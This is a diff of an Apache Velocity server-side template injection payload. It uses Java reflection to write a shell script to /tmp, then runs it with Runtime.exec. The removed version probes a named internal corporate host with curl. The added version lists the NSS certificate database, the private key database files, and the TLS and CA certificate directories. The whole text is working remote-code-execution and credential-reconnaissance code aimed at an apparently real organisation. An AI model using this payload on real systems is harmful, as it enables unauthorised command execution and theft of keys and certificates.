@@ -1,6 +1,6 @@
 #set($x = "")
 #set($w2 = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$w2.write("echo ===HTTPS-IN===; curl -s -o /dev/null -w 'code=%{http_code}\n' -m 8 -k https://drtoad.corp.dianrong.com/ 2>&1; echo ===CERTUTIL===; which certutil openssl pk12util 2>&1; echo ===NSS===; ls -la /etc/pki/nssdb/ 2>&1 | head -6")
+$w2.write("echo ===CERTLST===; certutil -L -d /etc/pki/nssdb 2>&1 | head -25; echo ===KEYDB===; ls -la /etc/pki/nssdb/key3.db /etc/pki/nssdb/key4.db 2>&1; echo ===ROOTCACFG===; ls -la /etc/pki/tls/certs 2>&1 | head -10; ls -la /etc/pki/CA 2>&1 | head -8")
 $w2.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
